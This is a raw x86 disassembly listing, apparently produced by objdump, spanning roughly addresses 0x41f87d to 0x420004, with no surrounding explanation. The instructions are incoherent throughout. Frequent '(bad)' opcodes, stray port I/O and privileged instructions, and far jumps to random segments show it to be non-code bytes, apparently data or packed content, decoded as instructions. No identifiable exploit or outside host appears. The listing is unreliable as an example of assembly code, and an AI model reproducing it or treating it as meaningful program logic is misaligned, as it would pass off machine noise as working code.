  41f87d:	cmp    al,0x3b
  41f87f:	icebp  
  41f880:	adc    BYTE PTR [edx-0xac3b7f0],al
  41f886:	shl    DWORD PTR [edx],1
  41f888:	or     DWORD PTR [edx+edx*1+0x3b8081f],edi
  41f88f:	sbb    eax,DWORD PTR [ebx+0x37]
  41f892:	push   0xffffff8c
  41f894:	adc    eax,edi
  41f896:	add    BYTE PTR [eax],cl
  41f898:	sbb    ecx,DWORD PTR [ebp+0x4a50e3ed]
  41f89e:	pop    edx
  41f89f:	loop   0x41f884
  41f8a1:	loop   0x41f871
  41f8a3:	nop    DWORD PTR [ecx+ebp*2+0x79]
  41f8a8:	jmp    0x41f8cc
  41f8aa:	inc    esi
  41f8ab:	xlat   BYTE PTR ds:[ebx]
  41f8ac:	mov    ds:0xdda48ed9,eax
  41f8b1:	push   ebp
  41f8b2:	mov    ecx,eax
  41f8b4:	mov    al,ds:0xd9499bef
  41f8b9:	rol    BYTE PTR [eax+0x2a0e464],0xfd
  41f8c0:	dec    edx
  41f8c1:	inc    ecx
  41f8c2:	(bad)  [edx-0xa]
  41f8c5:	push   cs
  41f8c6:	inc    ebp
  41f8c7:	aas    
  41f8c8:	punpckhbw mm2,QWORD PTR ds:0x7fcbaab2
  41f8cf:	ret    
  41f8d0:	mov    cl,dl
  41f8d2:	aas    
  41f8d3:	ficomp DWORD PTR [ebx-0x10d2054a]
  41f8d9:	mov    ecx,0x2b1e54a5
  41f8de:	lods   eax,DWORD PTR ds:[esi]
  41f8df:	dec    edx
  41f8e0:	xchg   edi,eax
  41f8e1:	and    edx,DWORD PTR [ecx-0x3f78b20a]
  41f8e7:	jmp    0xb1be:0x9cb43d88
  41f8ee:	lods   al,BYTE PTR ds:[esi]
  41f8ef:	sub    DWORD PTR [esi+ebp*8-0x16],0xf5f1c46d
  41f8f7:	xor    BYTE PTR [edi+0x63],bl
  41f8fa:	mov    DWORD PTR [edi-0x2cceaacb],edx
  41f900:	enter  0x231b,0xb7
  41f904:	mov    eax,DWORD PTR [edi]
  41f906:	jnp    0x41f931
  41f908:	fstp   QWORD PTR [ebp-0x3b9581ce]
  41f90e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f90f:	imul   eax,DWORD PTR [edx+0x2fe38f8d],0x1a
  41f916:	xor    dh,BYTE PTR [eax]
  41f918:	lahf   
  41f919:	add    eax,0x27bfbe38
  41f91e:	js     0x41f8de
  41f920:	data16 (bad) 
  41f922:	xchg   edx,eax
  41f923:	dec    edx
  41f924:	icebp  
  41f925:	imul   bl
  41f927:	ins    DWORD PTR es:[edi],dx
  41f928:	test   al,0xc3
  41f92a:	call   0x6965:0x23a9f55b
  41f931:	cld    
  41f932:	dec    edi
  41f933:	xchg   dl,dh
  41f935:	je     0x41f8d2
  41f937:	stos   BYTE PTR es:[edi],al
  41f938:	mov    esi,esp
  41f93a:	aam    0xbf
  41f93c:	xor    DWORD PTR [edx+0x5a],edi
  41f93f:	rol    edx,cl
  41f941:	pop    esi
  41f942:	cmp    bh,BYTE PTR [ecx-0x4f955f92]
  41f948:	ds push ecx
  41f94a:	add    bh,0xa0
  41f94d:	push   edx
  41f94e:	call   0xc31b9d75
  41f953:	repnz and eax,0xe47b8a19
  41f959:	sub    DWORD PTR [eax-0x59],0xf036792d
  41f960:	sub    eax,0x93a8f2ac
  41f965:	(bad)  
  41f966:	ss mov cl,0xc0
  41f969:	cmp    ch,BYTE PTR ds:0x29682e62
  41f96f:	sub    al,0x1f
  41f971:	jle    0x41f9b7
  41f973:	or     BYTE PTR [ecx],dl
  41f975:	dec    edi
  41f976:	adc    al,BYTE PTR [edx+0x12]
  41f979:	lods   al,BYTE PTR ds:[esi]
  41f97a:	cmp    ecx,ecx
  41f97c:	out    0x47,eax
  41f97e:	mov    dh,0xb2
  41f980:	xchg   esp,eax
  41f981:	adc    ch,BYTE PTR [edi]
  41f983:	sbb    BYTE PTR [edx-0x57],dl
  41f986:	loop   0x41f9d6
  41f988:	loopne 0x41f97f
  41f98a:	adc    esp,ebx
  41f98c:	dec    esi
  41f98d:	jmp    0xa2b980dc
  41f992:	shl    BYTE PTR [ebp+0x75],cl
  41f995:	nop
  41f996:	jns    0x41f955
  41f998:	mov    al,ds:0x6d12873e
  41f99d:	mov    bh,0x9d
  41f99f:	call   0x12c90ff3
  41f9a4:	jmp    0x41f990
  41f9a6:	mov    edx,?
  41f9a8:	or     BYTE PTR [ecx-0x2c8da5a5],bh
  41f9ae:	jne    0x41f9a8
  41f9b0:	aaa    
  41f9b1:	mov    ds:0xe587c355,eax
  41f9b6:	mov    ebx,0xd347d62b
  41f9bb:	dec    ebp
  41f9bc:	sbb    DWORD PTR [ecx+0x4d5ea4cb],esi
  41f9c2:	out    0x1c,al
  41f9c4:	lea    esi,[ecx]
  41f9c6:	pushf  
  41f9c7:	bound  esp,QWORD PTR ds:0x8aeb3717
  41f9cd:	ret    
  41f9ce:	mov    bl,0xe0
  41f9d0:	xchg   esi,eax
  41f9d1:	out    dx,al
  41f9d2:	add    eax,0x4078b0e2
  41f9d7:	jg     0x41fa05
  41f9d9:	nop
  41f9da:	pop    es
  41f9db:	add    DWORD PTR [ebx-0x45dfffdf],ebx
  41f9e1:	push   ss
  41f9e2:	fidiv  DWORD PTR [eax]
  41f9e4:	arpl   WORD PTR [ebx+0x3f],di
  41f9e7:	fnstenv [esi]
  41f9e9:	mov    eax,ds:0x290ced7c
  41f9ee:	fld    DWORD PTR [eax]
  41f9f0:	and    eax,0x743cea6d
  41f9f5:	(bad)  
  41f9f6:	stos   DWORD PTR es:[edi],eax
  41f9f7:	push   esp
  41f9f8:	setge  BYTE PTR [eax-0x6c797ecd]
  41f9ff:	(bad)  
  41fa00:	adc    esi,ebp
  41fa02:	and    eax,0x1790c75
  41fa07:	add    ax,0x9b79
  41fa0b:	(bad)  
  41fa0d:	and    esi,edx
  41fa0f:	jns    0x41f9d5
  41fa11:	jl     0x41f9a8
  41fa13:	xchg   DWORD PTR [esi-0x63],ebx
  41fa16:	mov    esi,0x95241a94
  41fa1b:	push   cs
  41fa1c:	sbb    DWORD PTR ds:[ecx-0x7c571efc],ebp
  41fa23:	dec    ebx
  41fa24:	int    0x4a
  41fa26:	push   ds
  41fa27:	xchg   edi,eax
  41fa28:	jmp    0x1d94f91b
  41fa2d:	and    BYTE PTR [edi+0x6d61fbfe],bl
  41fa33:	imul   ebx,DWORD PTR [ebp-0x6aaee77a],0xca248e62
  41fa3d:	fsubp  st(4),st
  41fa3f:	retf   
  41fa40:	add    BYTE PTR [eax-0x37],0xeb
  41fa44:	add    al,0x9d
  41fa46:	pop    ds
  41fa47:	pop    ss
  41fa48:	jp     0x41f9e0
  41fa4a:	dec    edx
  41fa4b:	ret    
  41fa4c:	in     eax,0xf6
  41fa4e:	and    al,0x80
  41fa50:	push   eax
  41fa51:	dec    esi
  41fa52:	adc    eax,DWORD PTR ds:0xcaecc045
  41fa58:	nop
  41fa59:	outs   dx,BYTE PTR ds:[esi]
  41fa5a:	cmp    al,0x1f
  41fa5c:	sub    BYTE PTR [ebp+0x33a93a96],al
  41fa62:	cmp    al,0x98
  41fa64:	add    eax,0x13513ba4
  41fa69:	pop    edx
  41fa6a:	shr    DWORD PTR [eax-0x77792d29],1
  41fa70:	push   esi
  41fa71:	gs ins DWORD PTR es:[edi],dx
  41fa73:	pop    edx
  41fa74:	add    eax,0x1609d4f4
  41fa79:	adc    al,0xcf
  41fa7b:	sbb    bh,BYTE PTR [esi-0x70]
  41fa7e:	push   ss
  41fa7f:	leave  
  41fa80:	test   DWORD PTR [eax+0x7e3905ad],eax
  41fa86:	dec    edi
  41fa87:	mov    bh,0x33
  41fa89:	xchg   esp,eax
  41fa8a:	dec    ebx
  41fa8b:	or     ebx,DWORD PTR [ebx]
  41fa8d:	stos   BYTE PTR es:[edi],al
  41fa8e:	xchg   edi,eax
  41fa8f:	sahf   
  41fa90:	call   0xcfdb:0x21295b10
  41fa97:	mov    ebx,0xd3d4d53e
  41fa9c:	push   es
  41fa9d:	and    eax,0xac1c21d8
  41faa2:	popf   
  41faa3:	mov    ebp,0x680f249e
  41faa8:	mov    al,ds:0x2aeb4568
  41faad:	aad    0xc2
  41faaf:	sbb    ch,BYTE PTR [edi]
  41fab1:	adc    al,0x12
  41fab3:	arpl   bx,bp
  41fab5:	ds das 
  41fab7:	fnsave [edx]
  41fab9:	cmp    esi,DWORD PTR [eax+0x71]
  41fabc:	xor    dh,BYTE PTR [edx]
  41fabe:	int    0x17
  41fac0:	aaa    
  41fac1:	sbb    edx,ebx
  41fac3:	mov    esp,0xe40aa5d1
  41fac8:	xor    BYTE PTR [ecx-0x3b1cd2c],bl
  41face:	clc    
  41facf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fad0:	loope  0x41fb04
  41fad2:	sahf   
  41fad3:	(bad)  [esp+ebx*4-0x5b]
  41fad7:	xor    dh,BYTE PTR [ebp+0x12]
  41fada:	(bad)  
  41fadb:	pop    ds
  41fadc:	fcomip st,st(2)
  41fade:	xchg   edi,eax
  41fadf:	mov    bl,BYTE PTR [edx]
  41fae1:	mov    ebx,0x88220ef2
  41fae6:	js     0x41facb
  41fae8:	imul   ecx,DWORD PTR [eax+0x5dfcc5e9],0x22791157
  41faf2:	cmp    eax,0x4f9bcf4e
  41faf7:	jle    0x41fb60
  41faf9:	dec    edx
  41fafa:	jo     0x41fb43
  41fafc:	add    ebp,DWORD PTR ds:[ebp+0x29]
  41fb00:	xor    esi,DWORD PTR [ebx]
  41fb02:	imul   edi,DWORD PTR [edx+edx*4-0x5377cb50]
  41fb0a:	pop    eax
  41fb0b:	inc    ebp
  41fb0c:	ret    0x2b9d
  41fb0f:	repz dec ebp
  41fb11:	jecxz  0x41fb80
  41fb13:	and    dl,BYTE PTR [ecx]
  41fb15:	cmp    DWORD PTR [edx-0x3f],esi
  41fb18:	fs cwde 
  41fb1a:	xor    dh,BYTE PTR [ebx+0x5f5e69e0]
  41fb20:	xchg   ebx,eax
  41fb21:	and    BYTE PTR [ebp+esi*4-0x37],dh
  41fb25:	nop
  41fb26:	ss add al,0xe1
  41fb29:	(bad)  
  41fb2a:	dec    eax
  41fb2b:	jg     0x41fb2d
  41fb2d:	xchg   DWORD PTR [eax-0x4fdfe03b],ebp
  41fb33:	add    eax,0x5f6227fa
  41fb38:	inc    eax
  41fb39:	call   0x2a1f22e2
  41fb3e:	sub    al,BYTE PTR [ebx]
  41fb40:	dec    edi
  41fb41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb42:	push   ecx
  41fb43:	pop    ebx
  41fb44:	add    eax,0xaa3fa4c6
  41fb49:	adc    al,0x64
  41fb4b:	sub    eax,0x3be9cb42
  41fb50:	pushf  
  41fb51:	push   edx
  41fb52:	pop    ds
  41fb53:	xlat   BYTE PTR ds:[ebx]
  41fb54:	sbb    BYTE PTR [edi+esi*1-0x4fa0f591],0x6e
  41fb5c:	mov    edx,0x66f1d76d
  41fb61:	dec    ebx
  41fb62:	add    bh,bh
  41fb64:	das    
  41fb65:	mov    ds:0x26f47a3c,eax
  41fb6a:	sti    
  41fb6b:	ror    BYTE PTR [ebx],1
  41fb6d:	adc    edi,edi
  41fb6f:	inc    esi
  41fb70:	jns    0x41fb18
  41fb72:	pop    esp
  41fb73:	in     al,0xd0
  41fb75:	fcom   DWORD PTR [ecx]
  41fb77:	fcom   QWORD PTR [edx-0x6]
  41fb7a:	or     edi,DWORD PTR [ebp+0xf]
  41fb7d:	test   eax,0x2c01d0e5
  41fb82:	push   ss
  41fb83:	cmp    bh,BYTE PTR [edi+eax*4+0x1c668712]
  41fb8a:	in     eax,0xb
  41fb8c:	addr16 test esi,0x9c2d3c3a
  41fb93:	pop    ds
  41fb94:	sbb    dl,BYTE PTR ss:[edx]
  41fb97:	xor    BYTE PTR [esi+0x60413815],0x95
  41fb9e:	xor    DWORD PTR [si],0x58e24677
  41fba5:	stos   DWORD PTR es:[edi],eax
  41fba6:	out    dx,eax
  41fba7:	rol    DWORD PTR [edi],1
  41fba9:	ror    BYTE PTR [esi],1
  41fbab:	xchg   edx,eax
  41fbac:	and    DWORD PTR [eax],edx
  41fbae:	out    dx,eax
  41fbaf:	fs push cs
  41fbb1:	xchg   esi,eax
  41fbb2:	jae    0x41fbb3
  41fbb4:	sbb    eax,0xbe705b63
  41fbb9:	push   eax
  41fbba:	xlat   BYTE PTR ds:[ebx]
  41fbbb:	(bad)  
  41fbbc:	jnp    0x41fbae
  41fbbe:	jns    0x41fb76
  41fbc0:	mov    dh,0x83
  41fbc2:	cmp    DWORD PTR ds:0xc7d7185c,ebx
  41fbc8:	ja     0x41fbfc
  41fbca:	test   DWORD PTR [edi+edi*8-0x36ca1cea],esi
  41fbd1:	rcr    BYTE PTR [edx-0x64],1
  41fbd4:	call   0x2153254a
  41fbd9:	xchg   esi,eax
  41fbda:	or     al,0xfa
  41fbdc:	fwait
  41fbdd:	pop    ds
  41fbde:	fwait
  41fbdf:	pop    ss
  41fbe0:	fs sub cl,cl
  41fbe3:	mov    ch,0xd8
  41fbe5:	mov    eax,ds:0x11dc4b96
  41fbea:	jo     0x41fbe5
  41fbec:	xchg   dx,ax
  41fbee:	cwde   
  41fbef:	jne    0x41fb97
  41fbf1:	mov    edx,0x607a852c
  41fbf6:	(bad)  [eax-0x2a]
  41fbf9:	dec    esp
  41fbfa:	inc    esp
  41fbfb:	push   esp
  41fbfc:	and    bh,BYTE PTR [eax+0x98f895a]
  41fc02:	jmp    0x70171426
  41fc07:	loopne 0x41fc7e
  41fc09:	mov    ebx,ds
  41fc0b:	nop
  41fc0c:	push   eax
  41fc0d:	cmp    eax,DWORD PTR [esi]
  41fc0f:	cld    
  41fc10:	sbb    bl,BYTE PTR [ebx+0x13]
  41fc13:	ins    DWORD PTR es:[edi],dx
  41fc14:	sub    DWORD PTR [esi-0x5bc658ae],ecx
  41fc1a:	sbb    edi,0xae25024d
  41fc20:	(bad)  
  41fc21:	jbe    0x41fc30
  41fc23:	xchg   ebp,esi
  41fc25:	lahf   
  41fc26:	or     BYTE PTR [esi-0x3a3165d7],cl
  41fc2c:	sub    BYTE PTR [edx-0x22f5b8f4],dl
  41fc32:	and    BYTE PTR [esi],dh
  41fc34:	and    eax,0x2ee9618a
  41fc39:	fs and al,0xfd
  41fc3c:	aad    0x40
  41fc3e:	adc    edi,DWORD PTR [ecx+0x6eb9ef5a]
  41fc44:	xlat   BYTE PTR ds:[ebx]
  41fc45:	sub    edx,eax
  41fc47:	adc    ah,BYTE PTR [edi-0x49]
  41fc4a:	pop    ss
  41fc4b:	pop    eax
  41fc4c:	pop    ecx
  41fc4d:	inc    eax
  41fc4e:	push   0xfffffff0
  41fc50:	add    DWORD PTR [ebp+eiz*4+0x1b],esp
  41fc54:	cmp    BYTE PTR [edi+0x1d],ah
  41fc57:	cld    
  41fc58:	jmp    0x1c50:0x51391cb0
  41fc5f:	fnstcw WORD PTR [eax]
  41fc61:	shr    DWORD PTR [ecx-0x3f],0x5f
  41fc65:	push   eax
  41fc66:	cmp    esp,edx
  41fc68:	(bad)  
  41fc69:	pushf  
  41fc6a:	inc    BYTE PTR [ecx+0x5b]
  41fc6d:	in     al,0x85
  41fc6f:	or     DWORD PTR [ebx-0x33],edi
  41fc72:	jl     0x41fcce
  41fc74:	mov    esi,0x470bf9e5
  41fc79:	fst    QWORD PTR [eax+edi*1-0xb830681]
  41fc80:	je     0x41fc6b
  41fc82:	jns    0x41fca5
  41fc84:	cmp    bl,BYTE PTR ds:0x625eff4
  41fc8a:	xor    BYTE PTR [ebp+0x24],al
  41fc8d:	dec    esi
  41fc8e:	push   ecx
  41fc8f:	mov    eax,0x52246db2
  41fc94:	ret    
  41fc95:	into   
  41fc96:	and    al,0xb3
  41fc98:	in     al,dx
  41fc99:	sar    BYTE PTR [edx+eax*1],0x45
  41fc9d:	or     ebx,DWORD PTR ds:0x8deb13a4
  41fca3:	(bad)  
  41fca4:	shr    DWORD PTR [edi+0x12],1
  41fca7:	or     eax,0xa1bf9490
  41fcac:	shl    DWORD PTR [edx+0x22c82219],1
  41fcb2:	rcl    ch,0x58
  41fcb5:	xchg   DWORD PTR [edx-0x35e1a70c],edx
  41fcbb:	cmc    
  41fcbc:	test   al,0x5b
  41fcbe:	shr    BYTE PTR [edi-0x42b3a18a],1
  41fcc4:	mov    eax,DWORD PTR [esi-0x79]
  41fcc7:	and    BYTE PTR [edx],0xe9
  41fcca:	inc    ecx
  41fccb:	(bad)  
  41fccc:	adc    dh,dh
  41fcce:	or     ebx,DWORD PTR [ebp-0x787f7e3]
  41fcd4:	adc    BYTE PTR [edx],bh
  41fcd6:	mov    ss,WORD PTR [esi]
  41fcd8:	pusha  
  41fcd9:	mov    BYTE PTR [eax+0x78078c88],dl
  41fcdf:	(bad)
  41fce2:	in     eax,0x58
  41fce4:	mov    WORD PTR [esi+0x404769f0],cs
  41fcea:	pushf  
  41fceb:	dec    edx
  41fcec:	into   
  41fced:	mov    BYTE PTR [ebx+ebx*4],cl
  41fcf0:	pop    ss
  41fcf1:	push   cs
  41fcf2:	dec    eax
  41fcf3:	mov    ecx,0x8dc34c46
  41fcf8:	in     al,0xf7
  41fcfa:	xchg   ebp,eax
  41fcfb:	ins    DWORD PTR es:[edi],dx
  41fcfc:	jmp    0x9ace29ef
  41fd01:	xchg   BYTE PTR [ebx-0x57],ah
  41fd04:	xor    ebx,DWORD PTR [esi-0x3774c381]
  41fd0a:	pop    es
  41fd0b:	retf   
  41fd0c:	outs   dx,DWORD PTR ds:[esi]
  41fd0d:	adc    eax,0x723593ee
  41fd12:	or     DWORD PTR [ebx+0x1bb55cfe],edi
  41fd18:	cli    
  41fd19:	jg     0x41fd90
  41fd1b:	pop    eax
  41fd1c:	and    BYTE PTR [eax+0x1865c615],bh
  41fd22:	xchg   ecx,eax
  41fd23:	into   
  41fd24:	push   cs
  41fd25:	(bad)  
  41fd26:	mov    ch,0xef
  41fd28:	or     DWORD PTR [edx+0x70],ebx
  41fd2b:	aam    0x2e
  41fd2d:	cmp    bl,dh
  41fd2f:	add    BYTE PTR [edx],dl
  41fd31:	nop
  41fd32:	and    BYTE PTR [ecx+edi*8+0x31],0x42
  41fd37:	fsub   QWORD PTR [edx+0x221b6ec2]
  41fd3d:	aas    
  41fd3e:	enter  0xbdd7,0xfc
  41fd42:	pop    edi
  41fd43:	rcl    BYTE PTR [esi+0x11e71fdb],1
  41fd49:	icebp  
  41fd4a:	xchg   edi,eax
  41fd4b:	or     DWORD PTR [ecx],0xffffffdf
  41fd4e:	mov    ecx,0x2dc72d37
  41fd53:	aaa    
  41fd54:	das    
  41fd55:	hlt    
  41fd56:	outs   dx,BYTE PTR ds:[esi]
  41fd57:	lds    eax,FWORD PTR [edx+0x7c]
  41fd5a:	test   BYTE PTR [ecx+esi*8-0x1],0xc
  41fd5f:	mov    ?,WORD PTR [eax+0x7eb890b8]
  41fd65:	push   cs
  41fd66:	data16 das 
  41fd68:	mov    ah,0x4f
  41fd6a:	(bad)  
  41fd6b:	test   BYTE PTR [ebx-0x13c17801],0xe3
  41fd72:	push   ss
  41fd73:	fs mov cl,0xbf
  41fd76:	push   cs
  41fd77:	dec    ebx
  41fd78:	sbb    cl,BYTE PTR [edx+eax*4-0x73]
  41fd7c:	sahf   
  41fd7d:	pop    edi
  41fd7e:	cdq    
  41fd7f:	lds    ebp,FWORD PTR [eax]
  41fd81:	push   ebp
  41fd82:	ret    
  41fd83:	mov    esp,0xcb0ed0b9
  41fd88:	sbb    BYTE PTR ds:0xc7e62860,ah
  41fd8e:	sbb    al,0x72
  41fd90:	xor    BYTE PTR [ecx-0x73ec5d07],bl
  41fd96:	call   0x96d378c
  41fd9b:	(bad)  
  41fd9c:	retf   0x18e9
  41fd9f:	and    esi,DWORD PTR [ebp+0x6b]
  41fda2:	add    dl,BYTE PTR [ebx]
  41fda4:	fistp  DWORD PTR [edx-0x57]
  41fda7:	ret    0x6420
  41fdaa:	stos   DWORD PTR es:[edi],eax
  41fdab:	mov    ch,0xd6
  41fdad:	scas   al,BYTE PTR es:[edi]
  41fdae:	test   DWORD PTR [eax],esi
  41fdb0:	(bad)  [eax]
  41fdb2:	sbb    ebx,DWORD PTR [ecx+0x49b33c8c]
  41fdb8:	mov    edi,0x5fa11f85
  41fdbd:	idiv   esi
  41fdbf:	push   edi
  41fdc0:	push   es
  41fdc1:	pop    ebp
  41fdc2:	fucomi st,st(4)
  41fdc4:	addr16 retf 0xae5
  41fdc8:	mov    cl,0x61
  41fdca:	repz sbb ah,BYTE PTR [eax+ecx*2+0x1a]
  41fdcf:	mov    ah,0x72
  41fdd1:	pop    ebp
  41fdd2:	inc    esp
  41fdd3:	sbb    al,0x70
  41fdd5:	jg     0x41fdfe
  41fdd7:	test   al,0x7c
  41fdd9:	fcmovnu st,st(0)
  41fddb:	call   0x2e398ddb
  41fde0:	outs   dx,DWORD PTR ds:[esi]
  41fde1:	shl    DWORD PTR [eax+0x5c],1
  41fde4:	loopne 0x41fe1d
  41fde6:	enter  0x9859,0x73
  41fdea:	sbb    esi,ebx
  41fdec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fded:	mov    es,ebx
  41fdef:	icebp  
  41fdf0:	push   cs
  41fdf1:	pusha  
  41fdf2:	loope  0x41fdbc
  41fdf4:	arpl   sp,si
  41fdf6:	bound  ebp,QWORD PTR [eax+0x84271e7]
  41fdfc:	jb     0x41fe60
  41fdfe:	(bad)  
  41fdff:	xchg   ebx,eax
  41fe00:	jge    0x41fe28
  41fe02:	push   ecx
  41fe03:	int    0x2e
  41fe05:	arpl   WORD PTR [ecx-0x7a039063],ax
  41fe0b:	xlat   BYTE PTR ds:[ebx]
  41fe0c:	fcmovne st,st(2)
  41fe0e:	stc    
  41fe0f:	sbb    eax,0x54a977c3
  41fe14:	sub    cl,dh
  41fe16:	jmp    0x6e074e26
  41fe1b:	adc    DWORD PTR [esi-0x46],0xbb54b0fb
  41fe22:	cli    
  41fe23:	mov    esi,DWORD PTR [ebx]
  41fe25:	sbb    edi,DWORD PTR [ebp+0x20a34b11]
  41fe2b:	shl    BYTE PTR [eax-0x1e],1
  41fe2e:	mov    dl,0x2
  41fe30:	fimul  DWORD PTR [edx-0x74]
  41fe33:	pushf  
  41fe34:	sahf   
  41fe35:	pop    esi
  41fe36:	test   DWORD PTR [ebx],0xd44eb4f8
  41fe3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe3e:	fcmove st,st(3)
  41fe40:	int    0x89
  41fe42:	dec    ebp
  41fe43:	mov    eax,0xd4a6fe4c
  41fe48:	fs push es
  41fe4a:	jmp    0x673493ae
  41fe4f:	dec    edx
  41fe50:	jmp    0xd21b35ac
  41fe55:	dec    ebx
  41fe56:	sbb    ch,dh
  41fe58:	nop
  41fe59:	in     eax,dx
  41fe5a:	ret    
  41fe5b:	aad    0x6c
  41fe5d:	aaa    
  41fe5e:	cmp    ah,BYTE PTR [ebp+0xe941dde]
  41fe64:	in     al,dx
  41fe65:	shl    DWORD PTR [eax-0x34],1
  41fe68:	dec    ebx
  41fe69:	scas   eax,DWORD PTR es:[edi]
  41fe6a:	jg     0x41fe69
  41fe6c:	pop    ebx
  41fe6d:	mov    dh,0xd5
  41fe6f:	ss in  eax,dx
  41fe71:	jmp    0xe8e9f24
  41fe76:	inc    ecx
  41fe77:	int    0x83
  41fe79:	jo     0x41fe84
  41fe7b:	frstor [ebx-0x611db9d7]
  41fe81:	lods   al,BYTE PTR ds:[esi]
  41fe82:	out    0xb8,eax
  41fe84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe85:	adc    eax,0x45db1f76
  41fe8a:	sbb    DWORD PTR ds:0x6dbc0191,edi
  41fe90:	and    eax,0xbc60b4
  41fe95:	ficom  WORD PTR [esi-0x38]
  41fe98:	je     0x41ff0a
  41fe9a:	add    al,0x50
  41fe9c:	cmp    BYTE PTR [edx+ecx*4-0x5a],al
  41fea0:	add    DWORD PTR [esi+0x28],ecx
  41fea3:	inc    ecx
  41fea4:	mov    ds:0xf69694eb,eax
  41fea9:	in     eax,dx
  41feaa:	addr16 xor eax,0xf14e9ce6
  41feb0:	ins    BYTE PTR es:[edi],dx
  41feb1:	and    al,al
  41feb3:	test   BYTE PTR [edx],al
  41feb5:	ret    0xef93
  41feb8:	loop   0x41fed0
  41feba:	push   0x37
  41febc:	jmp    0x5c90935e
  41fec1:	pop    esi
  41fec2:	sub    dh,BYTE PTR [edx+0x624c8e49]
  41fec8:	inc    esi
  41fec9:	fcomp  DWORD PTR [ecx-0x28]
  41fecc:	repz add DWORD PTR ds:0xae661d48,0x7d
  41fed4:	rol    DWORD PTR [ebp+0xf],cl
  41fed7:	popf   
  41fed8:	retf   0x6ca7
  41fedb:	sbb    eax,0xffffff80
  41fede:	adc    al,0x40
  41fee0:	ror    BYTE PTR [eax+eax*1],1
  41fee3:	push   esp
  41fee4:	xor    ecx,DWORD PTR [esi+ebx*1+0x41]
  41fee8:	dec    edi
  41fee9:	call   0x274a:0xe33b9f09
  41fef0:	shl    BYTE PTR ds:0xd41bce37,1
  41fef6:	aam    0xb4
  41fef8:	lods   eax,DWORD PTR ds:[esi]
  41fef9:	fmulp  st(1),st
  41fefb:	daa    
  41fefc:	sub    ch,BYTE PTR [ecx]
  41fefe:	add    eax,0x52fe2f3e
  41ff03:	cld    
  41ff04:	rol    DWORD PTR [ecx-0x1f],1
  41ff07:	fsubr  st,st(3)
  41ff09:	stc    
  41ff0a:	or     eax,esi
  41ff0c:	push   es
  41ff0d:	xchg   esi,eax
  41ff0e:	pop    ss
  41ff0f:	xchg   BYTE PTR [ebx],dh
  41ff11:	jmp    0x41ff29
  41ff13:	mov    al,ds:0x47fe7c99
  41ff18:	loope  0x41ff57
  41ff1a:	xchg   edi,eax
  41ff1b:	mov    dh,BYTE PTR [ecx]
  41ff1d:	mov    al,BYTE PTR [edi+0x51]
  41ff20:	dec    edx
  41ff21:	cwde   
  41ff22:	ds cdq 
  41ff24:	mov    BYTE PTR [edi],dl
  41ff26:	ss into 
  41ff28:	jb     0x41ff29
  41ff2a:	adc    ebx,eax
  41ff2c:	jae    0x41ff92
  41ff2e:	and    eax,0x8e14cbed
  41ff33:	and    eax,0x9ebc39f2
  41ff38:	xchg   ebx,eax
  41ff39:	fisttp DWORD PTR [eax]
  41ff3b:	int    0x92
  41ff3d:	(bad)  
  41ff3e:	ret    0xd41c
  41ff41:	aam    0xe3
  41ff43:	jmp    0xe79261a6
  41ff48:	jae    0x41ff80
  41ff4a:	test   BYTE PTR [ebx],ah
  41ff4c:	repz hlt 
  41ff4e:	pop    ss
  41ff4f:	(bad)  
  41ff50:	xor    DWORD PTR [ecx],edx
  41ff52:	stc    
  41ff53:	cs mov ch,0xa0
  41ff56:	mov    ds:0xf53ee2ad,al
  41ff5b:	inc    edx
  41ff5c:	jl     0x41ff1e
  41ff5e:	fimul  WORD PTR [edx+0x3e8a1cf]
  41ff64:	pop    edx
  41ff65:	icebp  
  41ff66:	push   0xc49189b5
  41ff6b:	and    DWORD PTR [edx],ebx
  41ff6d:	outs   dx,DWORD PTR ds:[esi]
  41ff6e:	int    0xbd
  41ff70:	retf   
  41ff71:	jmp    0xc80c7b05
  41ff76:	inc    ebp
  41ff77:	out    0x72,eax
  41ff79:	out    0x87,eax
  41ff7b:	icebp  
  41ff7c:	pop    ebx
  41ff7d:	pop    eax
  41ff7e:	push   ds
  41ff7f:	stos   DWORD PTR es:[edi],eax
  41ff80:	jp     0x41ff70
  41ff82:	outs   dx,BYTE PTR ds:[esi]
  41ff83:	mov    eax,0x51f32cfc
  41ff88:	stc    
  41ff89:	ret    0xba2c
  41ff8c:	and    eax,0x4d8a0df6
  41ff91:	rcr    BYTE PTR [ebp+0x27],1
  41ff94:	test   BYTE PTR [eax],bh
  41ff96:	inc    edi
  41ff97:	loop   0x41ff62
  41ff99:	pop    ebx
  41ff9a:	loopne 0x41ff34
  41ff9c:	jmp    0x6d538bc6
  41ffa1:	aas    
  41ffa2:	sbb    DWORD PTR [esi],0x56
  41ffa5:	aad    0x3d
  41ffa7:	xchg   BYTE PTR [edi+0x49db1bbb],ch
  41ffad:	jno    0x41ff8f
  41ffaf:	stos   BYTE PTR es:[edi],al
  41ffb0:	int    0x84
  41ffb2:	mov    edx,0x5ef26f2c
  41ffb7:	stos   DWORD PTR es:[edi],eax
  41ffb8:	add    DWORD PTR [edi+0x6e],ebp
  41ffbb:	imul   esi,DWORD PTR [ecx+0x3de58f8d],0xffffffb1
  41ffc2:	pop    edx
  41ffc3:	enter  0xd034,0xed
  41ffc7:	ja     0x420039
  41ffc9:	pop    edi
  41ffca:	jecxz  0x41fff8
  41ffcc:	mov    edi,0x28cb6ca5
  41ffd1:	sti    
  41ffd2:	xor    cl,BYTE PTR [ebx-0x5c]
  41ffd5:	cs dec edi
  41ffd7:	dec    esp
  41ffd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffd9:	fimul  WORD PTR [eax+0x17]
  41ffdc:	pop    eax
  41ffdd:	loope  0x420034
  41ffdf:	(bad)  
  41ffe0:	xor    eax,DWORD PTR [eax]
  41ffe2:	and    BYTE PTR [edx+0x7fccc00],cl
  41ffe8:	jnp    0x41ffcc
  41ffea:	and    bl,BYTE PTR [ebx]
  41ffec:	or     al,0x2e
  41ffee:	or     dl,dl
  41fff0:	xor    DWORD PTR [eax+0x54],0x5b59fb49
  41fff7:	loopne 0x41ffcb
  41fff9:	jg     0x41ffd5
  41fffb:	inc    ecx
  41fffc:	jge    0x42001a
  41fffe:	or     BYTE PTR ds:0x8bb55510,bh
  420004:	inc    ebx
